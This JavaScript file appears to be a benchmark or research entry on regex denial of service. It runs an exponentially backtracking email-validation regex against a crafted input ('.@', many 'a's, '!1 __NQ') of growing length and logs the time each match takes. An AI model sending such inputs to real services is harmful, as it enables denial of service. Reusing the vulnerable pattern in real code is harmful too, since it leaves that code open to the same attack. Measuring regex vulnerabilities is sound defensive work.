/* 8007
 * ^[\.\w&#230;&#248;&#229;-]+@([a-z&#230;&#248;&#229;0-9]+([\.-]{0,1}[a-z&#230;&#248;&#229;0-9]+|[a-z&#230;&#248;&#229;0-9]?))+\.[a-z]{2,6}$
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:".@"+"a"*16+"!1 __NQ"
 */
var REGEX = /^[\.\w&#230;&#248;&#229;-]+@([a-z&#230;&#248;&#229;0-9]+([\.-]{0,1}[a-z&#230;&#248;&#229;0-9]+|[a-z&#230;&#248;&#229;0-9]?))+\.[a-z]{2,6}$/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '.@' + 'a'.repeat(i*1) + '!1 __NQ'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}